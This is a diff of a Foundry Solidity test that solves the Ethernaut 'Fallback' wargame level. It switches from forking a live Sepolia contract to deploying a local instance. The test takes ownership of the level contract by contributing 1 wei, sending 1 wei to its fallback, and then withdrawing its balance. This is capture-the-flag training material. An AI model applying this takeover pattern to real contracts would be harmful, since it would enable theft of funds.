@@ -1,26 +1,24 @@
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.21;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-import {Test} from "forge-std/Test.sol";
-import {Fallback} from "../src/Fallback.sol";
-import "forge-std/console.sol";
+import {EthernautTest} from "./utils/EthernautTest.sol";
+import {FallbackFactory} from "../src/factories/FallbackFactory.sol";
+import {Fallback} from "../src/levels/Fallback.sol";
 
-contract FallbackTest is Test {
-    Fallback public fallbackContract = Fallback(payable(0x4318c9aEEb22Be7B0D1aA230c2671915eB827a6C));
-
-    function setUp() external {
-	vm.createSelectFork(vm.rpcUrl("sepolia"));
+contract FallbackTest is EthernautTest {
+    function setUpLevel() public override {
+	FallbackFactory factory = new FallbackFactory();
+	ethernaut.registerLevel(factory);
+	levelAddress = ethernaut.createLevelInstance(factory);
     }
 
-    function testSolveChallenge() external {
-	fallbackContract.contribute{value: 1 wei}();
-	
-        (bool success, ) = address(fallbackContract).call{value: 1 wei}("");
+    function testSolveFallback() public {
+	Fallback instance = Fallback(payable(levelAddress));
+	instance.contribute{value: 1 wei}();
+	(bool success, ) = levelAddress.call{value: 1 wei}("");
 	require(success);
-	
-	fallbackContract.withdraw();
-
-	assertEq(address(fallbackContract).balance, 0);
+	instance.withdraw();
+	assert(ethernaut.submitLevelInstance(payable(levelAddress)));
     }
 
     receive() external payable { }
